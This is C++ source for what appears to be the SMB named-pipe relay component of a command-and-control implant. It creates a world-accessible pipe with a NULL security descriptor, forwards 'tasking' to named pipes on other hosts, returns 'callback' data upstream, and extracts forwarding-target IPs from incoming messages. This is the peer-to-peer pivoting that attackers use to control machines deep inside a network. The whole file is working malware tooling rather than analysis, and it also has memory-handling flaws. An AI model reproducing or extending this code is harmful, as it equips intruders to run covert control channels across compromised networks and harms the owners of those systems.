#include "SMB.h"

DWORD PrepareSMB(State & state) {
	SECURITY_ATTRIBUTES sa = { 0 };
	SECURITY_DESCRIPTOR sd = { 0 };
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd, TRUE, (PACL)NULL, FALSE);
	sa.nLength = (DWORD) sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = (LPVOID)&sd;
	sa.bInheritHandle = TRUE;

	std::string pipeName = std::string("\\\\.\\pipe\\") + std::string(SMB_PipeName);

	state.smbState.hInboundPipe = CreateNamedPipeA(pipeName.c_str(),
		PIPE_ACCESS_DUPLEX, 
		PIPE_TYPE_BYTE |
		PIPE_READMODE_BYTE |
		PIPE_WAIT,
		1,
		SMB_BufferSize,
		SMB_BufferSize,
		0,
		&sa);

	if (state.smbState.hInboundPipe == INVALID_HANDLE_VALUE)
		return false;

	return true;
}

DWORD ForwardTasking(std::string targetIP, std::string outboundData, std::string &returnData, State & state)
{
	DWORD dwResult = 0;
	BYTE *read = NULL;
	BYTE *send = NULL;

	// Generate \\\\<targetIP>\\pipe\\<SMB_PipeName>
	std::string targetEndpoint = std::string("\\\\") + targetIP + std::string("\\pipe\\") + std::string(SMB_PipeName);

	state.smbState.hOutboundPipe = CreateFileA(targetEndpoint.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	int t = GetLastError();
	if (state.smbState.hOutboundPipe == INVALID_HANDLE_VALUE)
		return false;

	SMBWrite(state.smbState.hOutboundPipe, state, outboundData);
	
	returnData = SMBRead(state.smbState.hOutboundPipe, state, SMB_ForwardTimeout);

	if (returnData.length() > 0)
		return true;

	return false;
}

std::string PerformSMBCallback(State & state, std::string &outboundData) {

	if (outboundData.length() > 0) {
		SMBWrite(state.smbState.hInboundPipe, state, outboundData);
		DisconnectNamedPipe(state.smbState.hInboundPipe);
	}

	BOOLEAN fConnected = ConnectNamedPipe(state.smbState.hInboundPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
	if (!fConnected)
	{
		Sleep(3000);
		return std::string("");
	}

	if (!WaitForPipe(state.smbState.hInboundPipe, SMB_ReadTimeout))
		return std::string("");

	std::string inboundData = SMBRead(state.smbState.hInboundPipe, state, SMB_ReadTimeout);

	if (inboundData.length() == 0)
		DisconnectNamedPipe(state.smbState.hInboundPipe);

	return inboundData;
}

DWORD WaitForPipe(HANDLE hPipe, DWORD timeout) {
	DWORD bytesAvailable = 0;

	while (timeout > 0) {
		PeekNamedPipe(hPipe, NULL, NULL, NULL, &bytesAvailable, NULL);
		if (bytesAvailable != 0) break;
		Sleep(SMB_PeekTime);
		timeout -= SMB_PeekTime;
	}
	if (timeout == 0 && bytesAvailable == 0) return 0;

	return 1;
}

DWORD SMBWrite(HANDLE hPipe, State & state, std::string outData)
{
	DWORD repeat = ((DWORD)outData.size() / SMB_MaxWrite) + 1;
	DWORD totalBytes = 0;

	for (DWORD loop = 0; loop < repeat; loop++)
	{
		DWORD running = loop * SMB_MaxWrite;
		DWORD retData = 0;
		DWORD bufSize = SMB_MaxWrite;
		BYTE *tmp = NULL;

		if (SMB_MaxWrite > (outData.size() - running))
			bufSize = (DWORD)outData.size() - running;

		tmp = new BYTE[bufSize];
		memcpy(tmp, outData.data() + running, bufSize);

		WriteFile(hPipe, tmp, bufSize, &retData, NULL);
		FlushFileBuffers(hPipe);
		totalBytes = totalBytes + retData;
	}

	if (totalBytes == outData.size())
		return true;

	return false;
}

std::string SMBRead(HANDLE hPipe, State & state, DWORD seconds)
{
	LPSTR data = NULL;
	DWORD dataLen = 0;
	DWORD dwAvailable = 0;
	DWORD timeout = GetTickCount() + (seconds * 1000);

	while (TRUE)
	{
		BYTE buffer[SMB_BufferSize] = { 0 };
		DWORD dwRead = 0;
		LPSTR tmp = NULL;

		if (!PeekNamedPipe(hPipe, NULL, NULL, NULL, &dwAvailable, NULL))
			break;

		// Break if there is no more data
		if (dataLen != 0 && dwAvailable == 0)
			break;

		// Break if timeout occurs
		if (GetTickCount() > timeout && dwAvailable == 0)
			break;

		if (!ReadFile(hPipe, buffer, sizeof(buffer), &dwRead, NULL))
			break;

		tmp = data;
		data = new char[dataLen + dwRead + 1];
		memcpy(data, tmp, dataLen);
		memcpy(data + dataLen, buffer, dwRead);
		dataLen = dataLen + dwRead;

		delete tmp;

		// If this is the last block, sleep shortly in case the buffer will be refilled
		if ((dataLen % SMB_MaxWrite) == 0)
			Sleep(100);
	}

	std::string outString = std::string(data, dataLen);
	
	delete data;

	return outString;
}


std::string GetForwardingTarget(std::string &inboundData) {

	LPSTR data = (LPSTR)inboundData.data();

	if((UCHAR)data[0] != SMB_SpecialByte)
		return std::string("");

	DWORD targetLength = data[1];

	std::string smbIP = inboundData.substr(2, targetLength);
	inboundData = inboundData.substr(2 + targetLength);

	return smbIP;
}
